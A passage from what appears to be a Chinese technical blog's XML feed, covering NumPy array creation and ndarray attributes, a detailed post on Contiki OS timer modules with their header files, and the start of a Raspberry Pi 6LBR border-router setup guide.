<td>np.concatenate()</td>
<td>将两个或多个数组合并成一个新的数组</td>
</tr>
</tbody>
</table>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.arange(<span class="number">6</span>)</div><div class="line">array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones(<span class="number">6</span>)</div><div class="line">array([ <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>,  <span class="number">1.</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.zeros((<span class="number">3</span>,<span class="number">2</span>))</div><div class="line">array([[ <span class="number">0.</span>,  <span class="number">0.</span>],</div><div class="line">       [ <span class="number">0.</span>,  <span class="number">0.</span>],</div><div class="line">       [ <span class="number">0.</span>,  <span class="number">0.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.full((<span class="number">2</span>,<span class="number">2</span>),<span class="number">6</span>)</div><div class="line">array([[<span class="number">6</span>, <span class="number">6</span>],</div><div class="line">       [<span class="number">6</span>, <span class="number">6</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.eye(<span class="number">3</span>) </div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">0.</span>,  <span class="number">0.</span>],</div><div class="line">       [ <span class="number">0.</span>,  <span class="number">1.</span>,  <span class="number">0.</span>],</div><div class="line">       [ <span class="number">0.</span>,  <span class="number">0.</span>,  <span class="number">1.</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">1</span>]]) </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones_like(a) <span class="comment">#生成一个与a数组相同结构的全1数组</span></div><div class="line">array([[<span class="number">1</span>, <span class="number">1</span>],</div><div class="line">       [<span class="number">1</span>, <span class="number">1</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>np.linspace(<span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>)   <span class="comment"># 1为起始数，10为终止数，6为数的个数</span></div><div class="line">array([  <span class="number">1.</span> ,   <span class="number">2.8</span>,   <span class="number">4.6</span>,   <span class="number">6.4</span>,   <span class="number">8.2</span>,  <span class="number">10.</span> ])</div></pre></td></tr></table></figure>
<h5 id="ndarray-的属性"><a href="#ndarray-的属性" class="headerlink" title="ndarray 的属性"></a>ndarray 的属性</h5><ul>
<li>shape：一个说明 ndarray 对象各维度大小的元组</li>
</ul>
<p>　　对一个 n 行 m 列的矩阵来说，shape为 (n,m)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.shape</div><div class="line">(<span class="number">4</span>,)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.shape = <span class="number">2</span>, <span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">array([[<span class="number">1</span>, <span class="number">2</span>]</div><div class="line">       [<span class="number">3</span>, <span class="number">4</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>k = c.reshape(<span class="number">4</span>,)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>k</div><div class="line">array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>k[<span class="number">0</span>] = <span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>k</div><div class="line">array([<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">array([[<span class="number">0</span>, <span class="number">2</span>]</div><div class="line">       [<span class="number">3</span>, <span class="number">4</span>]])</div></pre></td></tr></table></figure>
<p>　　使用数组的 reshape 方法，可以创建一个改变了尺寸的新数组，原数组的 shape 保持不变。</p>
<p>　　<strong>注意：k 与 c 共享内存区域，所以修改其中任意一个数组的元素都会同时修改另外一个数组的内容。</strong></p>
<ul>
<li>dtype：ndarray 对象的元素类型</li>
</ul>
<p>　　数组的元素类型可以通过 dtype 属性获得，可以通过 dtype 参数在创建时指定元素类型。</p>
<p>　　类型可以是 numpy.int32，numpy.int16，and numpy.float64 等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.dtype</div><div class="line">dtype(<span class="string">'int32'</span>)</div></pre></td></tr></table></figure>
<p>　　创建数组时也可以指定元素的数据类型: </p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt;&gt;&gt;np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]], dtype = np.float)</div><div class="line">array([[ <span class="number">1.</span>,  <span class="number">2.</span>,  <span class="number">3.</span>,  <span class="number">4.</span>],</div><div class="line">       [ <span class="number">5.</span>,  <span class="number">6.</span>,  <span class="number">7.</span>,  <span class="number">8.</span>]])</div></pre></td></tr></table></figure>
<ul>
<li>ndim：数组的维数，也称为 rank（秩）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.ndim</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure>
<ul>
<li>size：ndarray 对象元素的个数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.size</div><div class="line"><span class="number">8</span></div></pre></td></tr></table></figure>
<ul>
<li>itemsize：ndarray 对象中每个元素的大小，即占用的字节数。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.itemsize</div><div class="line"><span class="number">4</span></div></pre></td></tr></table></figure>
<ul>
<li>data：指向数据内存。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.data</div><div class="line">&lt;read-write buffer <span class="keyword">for</span> <span class="number">0x02D89E30</span>, size <span class="number">32</span>, offset <span class="number">0</span> at <span class="number">0x02CE7DE0</span>&gt;</div></pre></td></tr></table></figure>
<h5 id="ndarray-的数据类型"><a href="#ndarray-的数据类型" class="headerlink" title="ndarray 的数据类型"></a>ndarray 的数据类型</h5><p>　　Python 语法仅支持整数、浮点数和复数 3 种类型，而 ndarray 支持多种数据类型，这也正是其用于科学计算的强大之处。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>bool</td>
<td>布尔类型，True或False</td>
</tr>
<tr>
<td>intc</td>
<td>与C语言中的int类型一致，一般是int32或int64</td>
</tr>
<tr>
<td>intp</td>
<td>用于索引的整数，与C语言中ssize_t一致，int32或int64</td>
</tr>
<tr>
<td>int8</td>
<td>字节长度的整数，取值：[‐128, 127]</td>
</tr>
<tr>
<td>int16</td>
<td>16位长度的整数，取值：[‐32768, 32767]</td>
</tr>
<tr>
<td>int32</td>
<td>32位长度的整数，取值：[‐2^31,2^31‐1]</td>
</tr>
<tr>
<td>int64</td>
<td>64位长度的整数，取值：[‐2^63,2^63‐1]</td>
</tr>
<tr>
<td>uint8</td>
<td>8位无符号整数，取值：[0, 255]</td>
</tr>
<tr>
<td>uint16</td>
<td>16位无符号整数，取值：[0, 65535]</td>
</tr>
<tr>
<td>uint32</td>
<td>32位无符号整数，取值：[0,2^32‐1]</td>
</tr>
<tr>
<td>uint64</td>
<td>32位无符号整数，取值：[0,2^64‐1]</td>
</tr>
<tr>
<td>float16</td>
<td>16位半精度浮点数：1位符号位，5位指数，10位尾数</td>
</tr>
<tr>
<td>float32</td>
<td>32位半精度浮点数：1位符号位，8位指数，23位尾数</td>
</tr>
<tr>
<td>float64</td>
<td>64位半精度浮点数：1位符号位，11位指数，52位尾数</td>
</tr>
<tr>
<td>complex64</td>
<td>复数类型，实部和虚部都是32位浮点数</td>
</tr>
<tr>
<td>complex128</td>
<td>复数类型，实部和虚部都是64位浮点数</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title>Contiki 定时器部分详解</title>
    <url>/2017/04/06/Contiki%20%E5%AE%9A%E6%97%B6%E5%99%A8%E9%83%A8%E5%88%86%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>　　Contiki 有一个 clock 模块和一系列 timer 模块：timer，stimer，ctimer，etimer，和 rtimer。</p>
<p>　　Contiki 的定时器种类太多，在初期会让人有一种分不清的感觉。都是以 timer（硬件定时器）为基础拓展成软件的定时器方式，有的以事件方式、有的以回调方式，有的通过粗精度来保证软件的低消耗，可以通过功能的划分来选择不同的定时器。</p>
<a id="more"></a>
<h4 id="Clock模块"><a href="#Clock模块" class="headerlink" title="Clock模块"></a>Clock模块</h4><p>　　clock.h 位于 contiki/core/sys。该文件为内核文件，定义了 clock 模块实现的接口和必要条件。</p>
<ul>
<li>clock_init() 函数</li>
</ul>
<p>　　就是初始化系统时钟。</p>
<ul>
<li>clock_time() 函数</li>
</ul>
<p>　　函数就是计时函数，直接返回 count 的值，这样就知道当前时间了。</p>
<ul>
<li>clock_seconds() 函数</li>
</ul>
<p>　　函数返回以秒为单位的数值 seconds。该全局变量在时钟中断函数中，每当 count 值为 128 时，都会加 1，相当于每增加 1 都经过了 1 秒。</p>
<ul>
<li>clock_delay() 和 clock_wait() 函数</li>
</ul>
<p>　　用来阻塞 CPU 的，但不会放弃控制权，就是平常的延时函数，有的底层驱动可能会需要。</p>
<p>　　CLOCK_SECOND 宏就是一秒的宏，该宏值乘以 7.8ms 应该是 1s，所以程序里面设置该宏值为 128，这样，<code>128 * 7.8 = 998.4≈1S</code>。</p>
<p>　　有 clock.h 必有 clock.c，该文件与具体的硬件平台有关，它可以位于 contiki/cpu/ 下，也可以位于 contiki/platform/ 下。</p>
<h4 id="Timer定时器"><a href="#Timer定时器" class="headerlink" title="Timer定时器"></a>Timer定时器</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>　　Timer 定时器以 clock 的 tick 作为时间精度，它是 Contiki 系统最基础的定时器，它使用 Contiki 系统时钟模块中的 clock_time() 函数来获取系统当前时间以便实现定时功能，等待时间到达以后触发，需要轮询调用，即应用程序必须去主动检查定时器是否过期,不能自动的的获得过期的消息。clock 模块提供一些处理系统时间的函数，还有一些用来阻塞 CPU 的函数。</p>
<h5 id="定时器API定义"><a href="#定时器API定义" class="headerlink" title="定时器API定义"></a>定时器API定义</h5><p>　　/home/user/contiki/core/sys/timer.h：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TIMER_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMER_H_</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sys/clock.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 定义一个Timer定时器对象。定时器在使用之前必须通过timer_set()进行设置。</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer</span> &#123;</span></div><div class="line">  <span class="keyword">clock_time_t</span> start;</div><div class="line">  <span class="keyword">clock_time_t</span> interval;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">//设置并启动一个Timer定时器对象</span></div><div class="line"><span class="function">CCIF <span class="keyword">void</span> <span class="title">timer_set</span><span class="params">(struct timer *t, <span class="keyword">clock_time_t</span> interval)</span></span>;</div><div class="line"><span class="comment">//复位一个Timer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_reset</span><span class="params">(struct timer *t)</span></span>;</div><div class="line"><span class="comment">//重启一个Timer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_restart</span><span class="params">(struct timer *t)</span></span>;</div><div class="line"><span class="comment">//检查一个Timer定时器对象是否到期</span></div><div class="line"><span class="function">CCIF <span class="keyword">int</span> <span class="title">timer_expired</span><span class="params">(struct timer *t)</span></span>;</div><div class="line"><span class="comment">//获取一个Timer定时器对象距离所设置的到期时长还剩余多少时间</span></div><div class="line"><span class="keyword">clock_time_t</span> timer_remaining(struct timer *t);</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* TIMER_H_ */</span></span></div></pre></td></tr></table></figure>
<h5 id="API的具体实现"><a href="#API的具体实现" class="headerlink" title="API的具体实现"></a>API的具体实现</h5><p>　　位于 /home/user/contiki/core/sys 目录下的 timer.c 文件中。</p>
<h4 id="Stimer"><a href="#Stimer" class="headerlink" title="Stimer"></a>Stimer</h4><h5 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h5><p>　　设定定时器，以 second 作为时间精度，等待时间到达以后触发，需要轮询调用。实际上 stimer 这个模块跟 timer 的用法，及 API 的功能完全一致，只不过 timer 定时 us 级别的时间，stimer 定时 s 级别的时间。</p>
<h5 id="定时器API定义-1"><a href="#定时器API定义-1" class="headerlink" title="定时器API定义"></a>定时器API定义</h5><p>　　/home/user/contiki/core/sys/stimer.h：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STIMER_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> STIMER_H_</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sys/clock.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> * 定义一个Stimer定时器对象。定时器在使用之前必须通过stimer_set()进行设置。</div><div class="line"> */</div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stimer</span> &#123;</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> start;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> interval;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// 设置并启动一个Stimer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">stimer_set</span><span class="params">(struct stimer *t, <span class="keyword">unsigned</span> <span class="keyword">long</span> interval)</span></span>;</div><div class="line"><span class="comment">// 重置一个Stimer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">stimer_reset</span><span class="params">(struct stimer *t)</span></span>;</div><div class="line"><span class="comment">// 重启一个Stimer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">stimer_restart</span><span class="params">(struct stimer *t)</span></span>;</div><div class="line"><span class="comment">// 检查一个Timer定时器对象是否到期</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">stimer_expired</span><span class="params">(struct stimer *t)</span></span>;</div><div class="line"><span class="comment">// 获取一个Timer定时器对象距离所设置的到期时长还剩余多少时间</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">stimer_remaining</span><span class="params">(struct stimer *t)</span></span>;</div><div class="line"><span class="comment">// 得到定时器启动后的时间</span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">stimer_elapsed</span><span class="params">(struct stimer *t)</span></span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* STIMER_H_ */</span></span></div></pre></td></tr></table></figure>
<h5 id="API的具体实现-1"><a href="#API的具体实现-1" class="headerlink" title="API的具体实现"></a>API的具体实现</h5><p>　　位于 /home/user/contiki/core/sys 目录下的 stimer.c 文件中。</p>
<h4 id="Etimer"><a href="#Etimer" class="headerlink" title="Etimer"></a>Etimer</h4><h5 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h5><p>　　事件定时器，调用 clock_time 获得当前系统的时间，它提供产生时间事件（timed event）的机制，当设定好的定时器到期时将会给绑定定时器的线程发送一个 PROCESS_EVENT_TIMER 事件；</p>
<p>　　Contiki 系统可以使用这个定时器做事件调度，主要用在 Contiki 进程当系统的其它功能工作或休眼时，这个进程在等待一个时钟周期。Rime 协议栈里面会经常用来处理通信超时。</p>
<h5 id="定时器API定义-2"><a href="#定时器API定义-2" class="headerlink" title="定时器API定义"></a>定时器API定义</h5><p>　　/home/user/contiki/core/sys/etimer.h：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ETIMER_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ETIMER_H_</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sys/timer.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sys/process.h"</span></span></div><div class="line"></div><div class="line"><span class="comment">// 定义一个Etimer定时器对象，定时器在使用之前必须通过etimer_set()进行设置。</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">etimer</span> &#123;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timer</span> <span class="title">timer</span>;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">etimer</span> *<span class="title">next</span>;</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">process</span> *<span class="title">p</span>;</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// 设置并启动一个Etimer定时器对象</span></div><div class="line"><span class="function">CCIF <span class="keyword">void</span> <span class="title">etimer_set</span><span class="params">(struct etimer *et, <span class="keyword">clock_time_t</span> interval)</span></span>;</div><div class="line"><span class="comment">// 重置一个Etimer定时器对象</span></div><div class="line"><span class="function">CCIF <span class="keyword">void</span> <span class="title">etimer_reset</span><span class="params">(struct etimer *et)</span></span>;</div><div class="line"><span class="comment">// 重启一个Etimer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">etimer_restart</span><span class="params">(struct etimer *et)</span></span>;</div><div class="line"><span class="comment">// 获取事件定时器的过期时间。</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">etimer_adjust</span><span class="params">(struct etimer *et, <span class="keyword">int</span> td)</span></span>;</div><div class="line"><span class="comment">// 获取事件定时器的到期时间</span></div><div class="line"><span class="keyword">clock_time_t</span> etimer_expiration_time(struct etimer *et);</div><div class="line"><span class="comment">// 获取事件定时器的启动时间</span></div><div class="line"><span class="keyword">clock_time_t</span> etimer_start_time(struct etimer *et);</div><div class="line"><span class="comment">// 检查一个Etimer定时器对象是否到期</span></div><div class="line"><span class="function">CCIF <span class="keyword">int</span> <span class="title">etimer_expired</span><span class="params">(struct etimer *et)</span></span>;</div><div class="line"><span class="comment">// 停止一个Etimer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">etimer_stop</span><span class="params">(struct etimer *et)</span></span>;</div><div class="line"><span class="comment">// 通知事件定时器时钟已更改</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">etimer_request_poll</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="comment">// 检查是否有任何非过期的事件定时器</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">etimer_pending</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="comment">// 所有即将到期的事件定时器的下一个到期时间</span></div><div class="line"><span class="keyword">clock_time_t</span> etimer_next_expiration_time(<span class="keyword">void</span>);</div><div class="line"></div><div class="line">PROCESS_NAME(etimer_process);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ETIMER_H_ */</span></span></div></pre></td></tr></table></figure>
<h5 id="API的具体实现-2"><a href="#API的具体实现-2" class="headerlink" title="API的具体实现"></a>API的具体实现</h5><p>　　位于 /home/user/contiki/core/sys 目录下的 etimer.c 文件中。</p>
<h4 id="Ctimer"><a href="#Ctimer" class="headerlink" title="Ctimer"></a>Ctimer</h4><h5 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h5><p>　　回调定时器，调用 etimer，触发以后调用回调函数；</p>
<p>　　由于 Ctimer 同样也是事件定时器，只不过多了一个回调的功能，所以在初始化 Ctimer 时，用 etimer_set 来初始化系统启动时需要的 Ctimer，然后标记初始化完成。在 ctimer_process 中，主要是去轮询过期的 Ctimer，然后再进行回调。请注意，由于回调函数在另一个进程中，所以根据 protothread 的设计，需要调用  PROCESS_CONTEXT_BEGIN() 和 PROCESS_CONTEXT_END() 来临时的开辟其它进程中的上下文，最后关闭。（可参考 ctimer_process 的具体实现进行分析）</p>
<h5 id="定时器API定义-3"><a href="#定时器API定义-3" class="headerlink" title="定时器API定义"></a>定时器API定义</h5><p>　　/home/user/contiki/core/sys/ctimer.h：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">#ifndef CTIMER_H_</div><div class="line">#define CTIMER_H_</div><div class="line"></div><div class="line">#include "sys/etimer.h"</div><div class="line"></div><div class="line">// 定义一个Ctimer定时器对象</div><div class="line">struct ctimer &#123;</div><div class="line">  struct ctimer *next;</div><div class="line">  struct etimer etimer;</div><div class="line">  struct process *p;</div><div class="line">  void (*f)(void *);</div><div class="line">  void *ptr;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">// 复位一个Ctimer定时器对象</div><div class="line">void ctimer_reset(struct ctimer *c);</div><div class="line">// 重启一个Ctimer定时器对象</div><div class="line">void ctimer_restart(struct ctimer *c);</div><div class="line">// 设置并启动一个Ctimer定时器对象</div><div class="line">void ctimer_set(struct ctimer *c, clock_time_t t, void (*f)(void *), void *ptr);</div><div class="line">// 停止一个Ctimer定时器对象</div><div class="line">void ctimer_stop(struct ctimer *c);</div><div class="line">// 检查一个Ctimer定时器对象是否到期</div><div class="line">int ctimer_expired(struct ctimer *c);</div><div class="line">// 初始化Ctimer定时器</div><div class="line">void ctimer_init(void);</div><div class="line"></div><div class="line">#endif /* CTIMER_H_ */</div></pre></td></tr></table></figure>
<h5 id="API的具体实现-3"><a href="#API的具体实现-3" class="headerlink" title="API的具体实现"></a>API的具体实现</h5><p>　　位于 /home/user/contiki/core/sys 目录下的 ctimer.c 文件中。</p>
<h4 id="rtimer"><a href="#rtimer" class="headerlink" title="rtimer"></a>rtimer</h4><p>　　实时定时器，直接调用硬件平台，设定一个硬件实时定时器，触发以后调用一个定时器回调。它可以抢占任何进程，这样使得实时任务可以准确调度。</p>
<p>　　有两种类型的实时任务：一种是硬实时任务，一种是软实时任务，其中硬实时任务的优先级要高点。</p>
<p>　　rtimer 与其它的 timer 不一样的是，它在平台这一层只是提供了三个接口：</p>
<ul>
<li>rtimer_init</li>
<li>rtimer_set</li>
<li>rtimer_run_next</li>
</ul>
<p>　　这三个接口的实现是严重依赖于 MCU 的特性的。</p>
<h5 id="定时器API定义-4"><a href="#定时器API定义-4" class="headerlink" title="定时器API定义"></a>定时器API定义</h5><p>　　/home/user/contiki/core/sys/rtimer.h：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> RTIMER_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RTIMER_H_</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"contiki-conf.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> RTIMER_CLOCK_LT</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">rtimer_clock_t</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RTIMER_CLOCK_LT(a,b)     ((signed short)((a)-(b)) &lt; 0)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* RTIMER_CLOCK_LT */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"rtimer-arch.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtimer_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtimer</span>;</span></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(* <span class="keyword">rtimer_callback_t</span>)</span><span class="params">(struct rtimer *t, <span class="keyword">void</span> *ptr)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">// 定义一个Ctimer定时器对象</span></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtimer</span> &#123;</span></div><div class="line">  <span class="keyword">rtimer_clock_t</span> time;</div><div class="line">  <span class="keyword">rtimer_callback_t</span> func;</div><div class="line">  <span class="keyword">void</span> *ptr;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">  RTIMER_OK,</div><div class="line">  RTIMER_ERR_FULL,</div><div class="line">  RTIMER_ERR_TIME,</div><div class="line">  RTIMER_ERR_ALREADY_SCHEDULED,</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// 设置并启动一个rtimer定时器对象</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">rtimer_set</span><span class="params">(struct rtimer *task, <span class="keyword">rtimer_clock_t</span> time,</span></span></div><div class="line">           <span class="keyword">rtimer_clock_t</span> duration, <span class="keyword">rtimer_callback_t</span> func, <span class="keyword">void</span> *ptr);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtimer_run_next</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">// 用于获取当前的rtimer时间</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RTIMER_NOW() rtimer_arch_now()</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RTIMER_TIME(task) ((task)-&gt;time)</span></div><div class="line"></div><div class="line"><span class="comment">// 针对特定平台的初始化操作，被rtimer_init()函数调用</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtimer_arch_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line"><span class="comment">// 传递一个唤醒时间，在特定时刻进行调度操作，调用rtimer_run_next()</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtimer_arch_schedule</span><span class="params">(<span class="keyword">rtimer_clock_t</span> t)</span></span>;</div><div class="line"><span class="comment">/*rtimer_clock_t rtimer_arch_now(void);*/</span></div><div class="line"></div><div class="line"><span class="comment">// rtimer每秒的滴答数</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> RTIMER_SECOND RTIMER_ARCH_SECOND</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* RTIMER_H_ */</span></span></div></pre></td></tr></table></figure>
<h5 id="API的具体实现-4"><a href="#API的具体实现-4" class="headerlink" title="API的具体实现"></a>API的具体实现</h5><p>　　位于 /home/user/contiki/core/sys 目录下的 rtimer.c 文件中。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>OS</category>
      </categories>
      <tags>
        <tag>Contiki</tag>
        <tag>定时器</tag>
      </tags>
  </entry>
  <entry>
    <title>Raspberry Pi 6LBR 配置教程</title>
    <url>/2017/03/31/Raspberry%20Pi%206LBR%20%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>　　6LBR 是目前国际上较为优秀的基于 Contiki 系统的 6LoWPAN 边界路由器解决方案。和现有的其他边界路由器方案相比，6LBR 是唯一一个不需要 Linux 主机的独立边界路由器，并且能够提供 IPv6/NDP 和 RPL 之间的智能互联。</p>
<p>　　本文介绍了如何在 Raspberry Pi 上配置 6LBR。</p>
